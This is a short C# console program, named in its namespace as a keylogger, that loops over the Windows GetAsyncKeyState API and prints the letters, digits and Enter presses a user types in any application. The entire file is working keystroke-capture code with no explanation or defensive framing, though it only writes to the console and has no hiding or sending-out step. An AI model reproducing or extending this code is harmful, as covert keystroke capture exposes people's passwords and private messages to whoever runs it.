using System;
using System.Runtime.InteropServices;

namespace MyKeyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern short GetAsyncKeyState(int _);
        static void Main()
        {  
            while (true)
            {
                for (int i = 'A'; i <= 'Z'; i++)
                    if (GetAsyncKeyState(i) == -32767)
                        if (GetAsyncKeyState(160) != 0) //160 - shift symbol
                            Console.Write((char)i);
                        else
                            Console.Write((char)(i - 'A' + 'a'));

                for (int i = '0'; i <= '9'; i++)
                    if (GetAsyncKeyState(i) == -32767)
                        Console.Write((char)i);
                if (GetAsyncKeyState(13) == -32767)
                    Console.WriteLine();
            }
        }
    }
}
